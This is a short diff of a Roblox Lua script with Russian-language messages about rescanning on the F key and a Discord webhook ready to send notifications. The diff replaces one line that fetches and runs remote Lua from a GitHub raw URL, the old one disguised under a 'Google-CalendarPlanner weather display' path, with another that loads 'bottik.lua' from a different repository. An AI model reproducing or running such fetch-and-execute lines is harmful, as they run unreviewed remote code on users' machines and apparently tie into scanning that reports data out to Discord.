@@ -534,4 +534,4 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
-loadstring(game:HttpGet("https://raw.githubusercontent.com/thecharleskerrr/Google-CalendarPlanner/refs/heads/main/%40Resources/Measures/weather%20display.lua"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/bottik.lua'))()
